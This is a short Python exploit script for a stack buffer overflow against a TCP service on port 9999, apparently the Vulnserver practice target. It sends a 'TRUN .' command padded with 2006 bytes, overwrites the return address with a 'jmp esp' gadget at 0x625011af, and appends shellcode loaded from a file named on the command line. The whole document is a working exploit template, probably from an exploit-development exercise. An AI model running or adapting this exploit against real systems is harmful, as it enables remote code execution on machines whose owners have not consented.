#!/usr/bin/python

import socket
import sys

server = sys.argv[1]
sport = 9999

with open(sys.argv[2], "rb") as f:
    attack2 = f.read()


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print(s.recv(1024))

attack = b'A' * 2006
attack += b'\xaf\x11\x50\x62' # 0x625011af      ffe4           jmp esp

attack += attack2
payload = (b'TRUN .' + attack + b'\r\n')
s.send(payload)
print(s.recv(1024))
s.send(b'EXIT\r\n')
print(s.recv(1024))
s.close()

